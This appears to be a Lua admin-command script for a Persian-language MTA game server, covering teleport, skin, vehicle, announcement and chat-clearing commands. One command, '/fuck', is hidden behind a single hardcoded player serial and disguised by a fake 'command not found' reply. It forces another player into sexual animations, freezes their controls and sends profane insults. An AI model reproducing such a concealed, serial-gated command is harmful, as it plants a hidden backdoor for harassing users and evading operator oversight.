-- PuB By @KhodeOxYGeM : )
local accSys = exports["Accounts-System"]
local miscSys = exports["misc"]
local vehSys = exports["[TN]DS"]
local VoiceSys = exports["[TN]Voice"]
local disSys = exports["[TN]Logger"]
local admin_veh = "TN-Dolat"
function AdminMessages(systemname,Message)
	for index, getAdmins in ipairs( getElementsByType("player") ) do 
		if getElementData(getAdmins, "loggedIn") == true then
			if tonumber(getElementData(accSys:getPlayerAcc(getAdmins), "pAdmin")) > 0 then
				outputChatBox ("#99FFFF("..systemname.."):#FFFFFF "..Message , getAdmins, 255,255,255 ,true)
			end
		end
	end
end
function PlayerMasseg(systemname,Message,player)
	outputChatBox ("#99FFFF("..systemname.."):#FFFFFF "..Message , player, 255,255,255 ,true)
end
function AllMessages(systemname,Message)
	for index, getAdmins in ipairs( getElementsByType("player") ) do 
		if getElementData(getAdmins, "loggedIn") == true then
			outputChatBox ("("..systemname.."):#FFFFFF "..Message , getAdmins, 230,0,0 ,true)
		end
	end
end
function CancelCommandEvent(player)
	if player then
		outputChatBox("#ff0000 ✖️ Shoma Dastresi Be In Dastoor Nadarid", player, 255, 255, 255, true)
	end
end
function findEmptyCarSeat(vehicle)
    local max = getVehicleMaxPassengers(vehicle)
    local pas = getVehicleOccupants(vehicle)
    for i=1, max do
        if not pas[i] then
            return i
        end
    end
    return false
end
function hideme(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 8 then
		if getElementData(thePlayer,"inKermRizi") == false then
			setElementAlpha(thePlayer,0)
			setElementData(thePlayer,"invis",true)
			setPlayerNametagShowing( thePlayer, false )
			setElementData(thePlayer,"inKermRizi",true)
		elseif getElementData(thePlayer,"inKermRizi") == true then
			setPlayerNametagShowing( thePlayer, true )
			setElementAlpha(thePlayer,255)
			setElementData(thePlayer,"invis",false)
			setElementData(thePlayer,"inKermRizi",false)
		end
	else
		outputChatBox("#ff0000CMD:#ff0000 Motasefane In Dastoor Yaft Nashod!", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("i",hideme)

addCommandHandler("adm",
function ( thePlayer, command, player, tedad )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local markeradmin = getElementData(thePlayer,"isMarkerAdmin")
    if markeradmin == true then
		setElementData(thePlayer, "isMarkerAdmin", false)
		outputChatBox("#ff0000 Admin Off!", thePlayer, 255, 255, 255, true)
	else
		setElementData(thePlayer, "isMarkerAdmin", true)
		outputChatBox("#00ff00 Admin On!", thePlayer, 255, 255, 255, true)
	end
end)




addCommandHandler("noclip",
function (thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 3 then
		triggerClientEvent(thePlayer, "command:noclip", thePlayer)
	end
end)

addCommandHandler("setnick",function(thePlayer,cmd,player,typs)
	if player and typs then

	end
end)

addCommandHandler("setsexa",
function (thePlayer, command, player, jensid)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
		outputChatBox("#ff0000 ✖️ Shoma Dastresi Be In Dastoor Nadarid×", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer(player)
	local jensid = tonumber(jensid)
	if player then
		if find then
			if jensid then
				if jensid == 1 then
					setElementData(accSys:getPlayerAcc(find), "pSex", 1)
					outputChatBox("#00ff00 ☑️ #ffffffShoma Jensiat'e #00ff00"..getPlayerName(find).." #ffffffRa Be #00ff00Male #ffffffSet Kardid+", thePlayer, 255, 255, 255, true)
					outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Jensiat Shoma Ra Be #ffffffMale #00ff00Set Kard+", find, 255, 255, 255, true)
				elseif jensid == 2 then
					setElementData(accSys:getPlayerAcc(find), "pSex", 2)
					outputChatBox("#00ff00 ☑️ #ffffffShoma Jensiat'e #00ff00"..getPlayerName(find).." #ffffffRa Be #00ff00Female #ffffffSet Kardid+", thePlayer, 255, 255, 255, true)
					outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Jensiat Shoma Ra Be #ffffffFemale #00ff00Set Kard+", find, 255, 255, 255, true)
				else
					outputChatBox("#ff0000 ✖️ #ffffffID Jensiat Eshtebah Mibashad × (1~2)", thePlayer, 255, 255, 255, true)
				end
			else
				outputChatBox("#ff0000 ✖️ #ffffffID Jensiat Ra Vared Konid ×", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000 ✖️ #ffffffPlayer Peyda Nashod ×", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Bezan: /setsex <PartOfName/ID> <Sex-ID>", thePlayer, 255, 255, 255, true)
	end
end)

addCommandHandler("fuck",
function (thePlayer,command,pname)
	if getPlayerSerial(thePlayer) == "11056965D2EF78959718CB70EC8F8493" then
		
		
	
		if pname then
			local taraf = miscSys:findPlayer ( pname )
			if taraf then
				if getPlayerName(taraf) == "ExoPrim" then
					namesh = getPlayerName(thePlayer)
					outputChatBox("#ff0000CMD:#ff0000 Boro Goom Sho Koskesh!", thePlayer, 255, 255, 255, true)
					outputChatBox("#ff0000CMD:#ff0000 "..namesh.." KosKesh Mikhast /fuck bezane!", taraf, 255, 255, 255, true)				
				else
					x,y,z = getElementPosition(thePlayer)
					local myint = getElementInterior( thePlayer )
					local mydim = getElementDimension( thePlayer )
					setElementPosition(thePlayer,x,y,z)
					x = x - math.sin ( math.rad ( 0 ) ) * -1
					y = y + math.cos ( math.rad ( 0 ) ) * -1
					setElementPosition(taraf,x,y,z)
					setElementInterior( taraf, myint )
					setElementDimension( taraf, mydim )
					setElementRotation( thePlayer, 0, 0, 180, "default", true)
					setElementRotation( taraf, 0, 0, 0, "default", true)
					setPedAnimation ( thePlayer, "sex", "sex_1_cum_p", -1, true, false, false )
					setPedAnimation ( taraf, "sex", "sex_1_cum_w", -1, true, false, false )
					toggleAllControls ( taraf, false, true, false)
					toggleAllControls ( thePlayer, false, true, false)
					setTimer( function()
						-- FIX (bugfix pass 4): the element can be gone by the time this timer
						--   fires (player quit / object destroyed). Without this guard MTA
						--   raises "Bad argument" and the rest of the callback never runs.
						if not isElement(thePlayer) then return end
						setPedAnimation ( thePlayer )
						setPedAnimation ( taraf )
						toggleAllControls ( thePlayer, true )
						toggleAllControls ( taraf, true )
					end, 30000, 1)
				end
			end
		end
	else
		outputChatBox("#ff0000CMD:#ff0000 Motasefane In Dastoor Yaft Nashod!", thePlayer, 255, 255, 255, true)
	end
end)


addCommandHandler("giveadm",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	if player then
		if find then
			local markeradmin = getElementData(find,"isMarkerAdmin")
			if markeradmin == true then
				setElementData(find, "isMarkerAdmin", false)
				outputChatBox("#ff0000 Admin Off!", thePlayer, 255, 255, 255, true)
			else
				setElementData(find, "isMarkerAdmin", true)
				outputChatBox("#00ff00 Admin On!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
	end
end)







addCommandHandler("fixvp",
function(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	local myVeh = getPedOccupiedVehicle(thePlayer)
	local vID = getElementData(myVeh,"vehicleID")
	if isPedInVehicle(thePlayer) then
		local tamirPrice = 2000*2
		if getPlayerMoney(thePlayer) >= tamirPrice then
			takePlayerMoney(thePlayer, tamirPrice)
			vehSys:setVehicleData(vID, "vTamir", 0)
			setElementData(myVeh, "tamir", 0)
			outputChatBox("#00ff00[Tavajoh]: #ffffffMashin Shoma Ba Hazine $"..tamirPrice.." Tamir Shod.", thePlayer, 255, 255, 255, true)
		else
			outputChatBox("#ff0000✖️ #ffffffBaraye Tamir Khodro Niaz Be $"..tamirPrice.." Darid!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#ff0000✖️ #ffffffSavar Mashin Nisti", thePlayer, 255, 255, 255, true)
	end
end)


addCommandHandler("ertefa",
function ( thePlayer, command ,value)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end
	if value then
		local value = tonumber(value)
		local myVehicle = getPedOccupiedVehicle ( thePlayer )
		if myVehicle then
			setVehicleHandling(myVehicle, "suspensionLowerLimit", value)
		else
			outputChatBox("#ff0000Error: Baraye Inkar Bayad Dakhel Mashin Bashid!", thePlayer, 255, 0, 0, true)
		end
	else
		outputChatBox("#ff0000Syntax: /ertefa <Value>", thePlayer, 255, 0, 0, true)
	end
end)


addCommandHandler("helpadmin",
function ( thePlayer, command ,value)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 3 then
		outputChatBox("#ff0000Error: Shoma Be In CMD Dastresi Nadarid .", thePlayer, 255, 255, 255, true)
		return
	end

	outputChatBox("#ff0000Level1: Ebteda /register sep 1234 1234!", thePlayer, 255, 0, 0, true)
	outputChatBox("#ff0000Level2: Ebteda /login sep 1234 !", thePlayer, 255, 0, 0, true)

end)

addCommandHandler("getpos",
	function ( thePlayer, command )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 2 then
			outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local x, y, z = getElementPosition(thePlayer)
		outputChatBox("#FF3341Mokhtasat: ("..x.." ,"..y.." ,"..z..")", thePlayer, 150, 150 , 150,true)
	    if ( isElement(thePlayer) and getElementType (thePlayer) == "player" ) then
			SendDiscordLog("PosLOG \n"..x..","..y..","..z.." ", thePlayer , command )
        	local rx, ry, rz = getElementRotation ( thePlayer )        
        	outputChatBox("#FF3341Rotation: ("..rx.." ,"..ry.." ,"..rz..")", thePlayer, 150, 150 , 150,true)
    	end
	end	
)
addCommandHandler("getppos",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	if player then
		if find then
			local x, y, z = getElementPosition(find)
			print("Mokhtasat: ("..x.." ,"..y.." ,"..z..")")    
			outputChatBox("#FF3341Mokhtasat: ("..x.." ,"..y.." ,"..z..")", thePlayer, 150, 150 , 150,true)
			if ( isElement(thePlayer) and getElementType (thePlayer) == "player" ) then
				local rx, ry, rz = getElementRotation ( find )    
				print("Rotation: ("..rx.." ,"..ry.." ,"..rz..")")    
				outputChatBox("#FF3341Rotation: ("..rx.." ,"..ry.." ,"..rz..")", thePlayer, 150, 150 , 150,true)
			end
		else
			outputChatBox("#ff0000[Error]: #ffffff✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setpos",
function (thePlayer, command, posX, posY, posZ, intID, dimID)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 2 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local posX, posY, posZ, intID , dimID = tonumber(posX), tonumber(posY), tonumber(posZ), tonumber(intID), tonumber(dimID)
	if posX and posY and posZ and intID and dimID then
		setElementPosition(thePlayer, posX, posY, posZ)
		setElementInterior(thePlayer, intID)
		setElementDimension(thePlayer, dimID)
		outputChatBox("#00ff00You Have Been Teleported To "..posX..", "..posY..", "..posZ, thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Interior: "..intID, thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00Dimension: "..dimID, thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#C0C0C0Syntax: /setpos <x> <y> <z> <int> <dim>", thePlayer, 255, 255, 255, true)
	end
end)





--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setmat",
function(thePlayer, command, player, meghdar)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	local meghdar = tonumber(meghdar)
	local targetPlayer = getPlayerName ( find )
	if player then
	if find then
	if meghdar then
		setElementData(accSys:getPlayerAcc(find), "pMats", meghdar)
		outputChatBox("#00ff00☑️ #ffffffShoma Material #00ff00"..targetPlayer.." #ffffffRa Be #00ff00"..meghdar.." #ffffffGeram Set Kardid!", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000✖️ #ffffffTedad Rob Point Ra Vared Konid!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#C0C0C0Bezan: /setmat  [PartOfName/ID]  [Geram]", thePlayer, 255, 255, 255, true)
	end
end)
--________________________________________________________________________________________________________--
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("gotopos",
function (thePlayer, command, posX, posY, posZ, intID, dimID)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
		outputChatBox("#ff0000✖️ #ffffffShoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local posX, posY, posZ, intID , dimID = tonumber(posX), tonumber(posY), tonumber(posZ), tonumber(intID), tonumber(dimID)
	if posX and posY and posZ and intID and dimID then
		Lastpos = "x: "..posX.." y: "..posY.." z: "..posZ.." INT: "..intID.." DIM: "..dimID
		disSys:SendDiscordLog("goto",command,thePlayer,"",Lastpos)
		setElementPosition(thePlayer, posX, posY, posZ)
		setElementInterior(thePlayer, intID)
		setElementDimension(thePlayer, dimID)
		outputChatBox("#00ff00Shoma Be In Mokhtasat Teleport Shodid: ", thePlayer, 255, 255, 255, true)
		outputChatBox("#00ff00"..posX.." ,"..posY.." ,"..posZ, thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#C0C0C0Bezan: /gotopos <x> <y> <z> <int> <dim>", thePlayer, 255, 255, 255, true)
		
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("cskin",
function ( thePlayer, command, player, skinid )
	if  getElementType(thePlayer) == "console" or tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 5  then	
		
		if player then
			local find = miscSys:findPlayer ( player )
		if find then
		if skinid then
			
			skinid = tonumber( skinid )
			if getPlayerName(thePlayer) ~= "pinki" and getPlayerName(thePlayer) ~= "ExoPrim" then
				if skinid == 129 then
					outputChatBox("#ff0000✖️ #ffffffID Skin Eshtebah Ast.", thePlayer, 255, 255, 255, true)
					return false
				end
			end
			local targetPlayer = getPlayerName ( find )
			setElementModel( find, skinid )
			setElementData(accSys:getPlayerAcc(find), "cSkin", skinid)
			outputChatBox("#00ff00☑️ #ffffffShoma Skin #00ff00"..targetPlayer.." #ffffffRa Be #00ff00"..skinid.." #ffffffSet Kardid!", thePlayer, 0, 255, 0, true)
			outputChatBox("#00ff00[Tavajoh]: #ffffffSkin Shoma Tavasote Admin #00ff00"..getPlayerName(thePlayer).." #ffffffBe #00ff00"..skinid.." #ffffffTaghir Yaft!", find, 0, 255, 0, true)
		else
			outputChatBox("#ff0000✖️ #ffffffID Skin Ra Vared Konid!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
			else
				outputChatBox("#C0C0C0Bezan: /cskin <PartOfName/ID> <Skin-ID>", thePlayer, 255, 0, 0, true)
			end
	else
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end	
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setmyskin",
function ( thePlayer, command, skinid )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 3 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	if skinid then
		skinid = tonumber( skinid )
		if getPlayerName(thePlayer) ~= "pinki" and getPlayerName(thePlayer) ~= "ExoPrim" then
			if skinid == 129 then
				outputChatBox("#ff0000✖️ #ffffffID Skin Eshtebah Ast.", thePlayer, 255, 255, 255, true)
				return false
			end
		end
			setElementModel( thePlayer, skinid )
			setElementData(accSys:getPlayerAcc(thePlayer), "cSkin", skinid)
			outputChatBox("#00ff00☑️ #ffffffShoma Skin Khod #ffffffRa Be #00ff00"..skinid.." #ffffffSet Kardid!", thePlayer, 0, 255, 0, true)
	else
		outputChatBox("#ff0000✖️ #ffffffID Skin Ra Vared Konid!", thePlayer, 255, 255, 255, true)
	end

end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("fskin",
function ( thePlayer, command, player, skinid )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local find = miscSys:findPlayer ( player )
	if player then
		if find then
			if skinid then
				skinid = tonumber( skinid )
				local targetPlayer = getPlayerName ( find )
				setElementModel( find, skinid )
				setElementData(accSys:getPlayerAcc(find), "fSkin", skinid)
				outputChatBox("#00ff00☑️ #ffffffShoma Skin Faction #00ff00"..targetPlayer.." #ffffffRa Be #00ff00"..skinid.." #ffffffSet Kardid!", thePlayer, 0, 255, 0, true)
				outputChatBox("#00ff00[Tavajoh]: #ffffffSkin Faction Shoma Tavasote Admin #00ff00"..getPlayerName(thePlayer).." #ffffffBe #00ff00"..skinid.." #ffffffTaghir Yaft!", find, 0, 255, 0, true)
			else
				outputChatBox("#ff0000✖️ #ffffffID Skin Ra Vared Konid!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
	else
		outputChatBox("#C0C0C0Bezan: /fskin <PartOfName/ID> <Skin-ID>", thePlayer, 255, 0, 0, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setskill",
	function ( thePlayer, command, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				skinid = tonumber( skinid )
				local targetPlayer = getPlayerName ( find )
				setElementModel( find, skinid )
				setElementData(accSys:getPlayerAcc(find), "pM4Skill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pAk47Skill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pColt47Skill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pSawnoffSkill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pDeagleSkill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pSpistolSkill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pShotgunSkill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pSpasSkill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pUziSkill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pMp5Skill", 1000)
				setElementData(accSys:getPlayerAcc(find), "pRifleSkill", 1000)
				setPedStat (find, 77, 1000)
				setPedStat (find, 71, 1000)
				setPedStat (find, 78, 1000)
				setPedStat (find, 72, 1000)
				setPedStat (find, 74, 1000)
				setPedStat (find, 69, 1000)
				setPedStat (find, 70, 1000)
				setPedStat (find, 79, 1000)
				setPedStat (find, 73, 1000)
				setPedStat (find, 75, 1000)
				setPedStat (find, 76, 1000)
				outputChatBox("#00ff00☑️ #ffffffShoma Skill Tamamye Gun Haye #00ff00"..targetPlayer.." #ffffffRa Be #00ff00 100 #ffffffSet Kardid!", thePlayer, 0, 255, 0, true)
				outputChatBox("#00ff00[Tavajoh]: #ffffffSkill Gun Haye Shoma Tavasote Admin #00ff00"..getPlayerName(thePlayer).." #ffffffBe #00ff00100 #ffffffTaghir Yaft!", find, 0, 255, 0, true)
			else
				outputChatBox("#ff0000✖️ #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Bezan: /setskill <PartOfName/ID>", thePlayer, 255, 0, 0, true)
		end
	end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("mypos",
	function ( thePlayer, command )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local x, y, z = getElementPosition(thePlayer)
		outputChatBox(""..x.." ,"..y.." ,"..z.."", thePlayer, 150, 150 , 150,true)
	    if ( isElement(thePlayer) and getElementType (thePlayer) == "player" ) then
        	local rx, ry, rz = getElementRotation ( thePlayer )        
        	outputChatBox(""..rx.." ,"..ry.." ,"..rz.."", thePlayer, 150, 150 , 150,true)
    	end
	end	
)

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("setws",
	function ( thePlayer, command,id )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if id then
			outputChatBox("#ff0000✖️!", thePlayer, 255, 255, 255, true)
			setPedWeaponSlot( thePlayer, id )
		end
	end	
)

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function yeMashinBaseAdmin( thePlayer, command, IDMashin )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 1 then
		local x, y, z = getElementPosition(thePlayer)
		local createdVehicle = createVehicle(tonumber(IDMashin), x + 2, y, z)
		local int = getElementInterior(thePlayer)
		local dem = getElementDimension(thePlayer)
		local vehname = getVehicleNameFromModel(tonumber(IDMashin))
		if tonumber(IDMashin) then
			setElementData(createdVehicle, "veh_owner", tostring(admin_veh))
			setVehiclePlateText(createdVehicle, "OwnerVeh")
			setElementInterior(createdVehicle, int)
			setElementDimension(createdVehicle, dem)
			setElementHealth( createdVehicle, 1500 )
			outputChatBox("#00ff00☑️ #ffffffShoma Yek Khodro #00ff00"..vehname.." #ffffffSakhtid!", thePlayer, 255, 255, 255, true)
			warpPedIntoVehicle(thePlayer,createdVehicle,0)
		else
			outputChatBox("#C0C0C0Bezan: /veh <Vehicle-ID>", thePlayer, 320, 320, 320, true)
		end
	else 
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end
end
addCommandHandler("veh", yeMashinBaseAdmin)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function PmForAll ( thePlayer, cmd, ... )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
    local message = table.concat ( { ... }, " " )
    if ... then
		

	  disSys:SendDiscordLog("sendmassegeforall",cmd,thePlayer,"",message)
      for index, allpl in ipairs(getElementsByType("player")) do
        outputChatBox ( "#FF0000** [Staff] ".. getPlayerName ( thePlayer ) ..": #FFFFFF".. message.." #ff0000**",  allpl,255, 255, 255, true )
      end
    else
      outputChatBox ("#C0C0C0Bezan: /o <Matn>", thePlayer, 255, 255, 255, true)
    end
end
addCommandHandler ("o", PmForAll)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function PmForAll2 ( thePlayer, _, ... )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 9 then
		return false
	end
    local message = table.concat ( { ... }, " " )
    if ... then
      for index, allpl in ipairs(getElementsByType("player")) do
        outputChatBox ( "#03fcb6[Persian News] : #FFFFFF".. message.." #ff0000",  allpl,255, 255, 255, true )
      end
    else
      outputChatBox ("#C0C0C0Bezan: pnews <Matn>", thePlayer, 255, 255, 255, true)
    end
end
addCommandHandler ("pnews", PmForAll2)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function cc(thePlayer)
	local thadmin = getPlayerName ( thePlayer )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 4 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)    return false
	end
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
	outputChatBox(" ", root, 208, 0, 15,true)
